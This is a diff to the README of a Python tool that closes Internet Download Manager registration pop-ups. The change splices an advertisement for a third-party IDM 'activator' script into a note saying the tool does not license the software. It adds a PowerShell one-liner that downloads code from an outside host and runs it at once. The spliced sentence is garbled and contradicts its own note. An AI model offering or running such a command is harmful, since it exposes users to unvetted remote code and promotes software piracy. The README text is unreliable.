@@ -86,7 +86,11 @@ python idm_popup_killer.py --interval 1 --cooldown 3 --batch-delay 0.08
 
 ## Notes
 
-- This tool only dismisses dialogs. It does not modify IDM, its files, or its registry entries, and it does not license the software. If you use IDM regularly, consider [buying a license](https://www.internetdownloadmanager.com/).
+- This tool only dismisses dialogs. It does not modify IDM, its files, or its registry entries, and it does not license the software. If you use IDM regularly, consider [buying a license](https://www.internetdownloadmanager.com/) or Option 2 — Coporton's Script (Activator + Registry Cleaner)
+This version explicitly bundles a registry cleaner option (menu item 5: "Clean Previous IDM Registry Entries") alongside activation.
+
+powershell
+irm https://coporton.com/ias | iex
 - Window-class and button-text matching is based on current IDM dialogs. If a future IDM version changes its dialogs, adjust `REGISTER_HINTS` and `DISMISS_BUTTONS` at the top of the script.
 
 ## License
